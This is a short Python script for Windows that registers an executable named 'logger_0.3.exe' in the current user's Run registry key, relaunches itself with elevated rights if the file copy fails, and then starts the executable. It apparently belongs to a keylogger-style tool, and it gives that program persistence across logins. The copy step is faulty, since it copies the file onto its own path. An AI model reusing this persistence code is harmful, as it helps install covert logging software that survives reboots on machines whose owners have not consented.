import os
import sys
import shutil
import subprocess
import winreg as reg
import ctypes
import traceback

def get_script_path():
    return os.path.dirname(os.path.abspath(sys.argv[0]))

def add_to_startup():
    script_path = os.path.join(get_script_path(), "logger_0.3.exe") ## running the .exe version of the logger_0.3.pyw. So, make sure to change it to .exe using the terminal by the command "pyinstaller --onefile logger_0.3.pyw".
    startup_path = os.path.join(get_script_path(), "logger_0.3.exe")
    
    try:
        shutil.copyfile(script_path, startup_path)
    except PermissionError:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit(0)
    
    key = reg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with reg.OpenKey(key, key_path, 0, reg.KEY_ALL_ACCESS) as reg_key:
        reg.SetValueEx(reg_key, "LoggerStartup", 0, reg.REG_SZ, startup_path)

def handle_exception(exc_type, exc_value, exc_traceback):
    error_message = "".join(traceback.format_exception(exc_type, exc_value, exc_traceback))
    with open("error_log.txt", "a") as log_file:
        log_file.write(error_message)
    ctypes.windll.user32.MessageBoxW(None, f"An error occurred:\n\n{error_message}", "Error", 0x10)

sys.excepthook = handle_exception

def run_script():
    script_path = os.path.join(get_script_path(), "logger_0.3.exe")
    subprocess.Popen(script_path, shell=True)

add_to_startup()
run_script()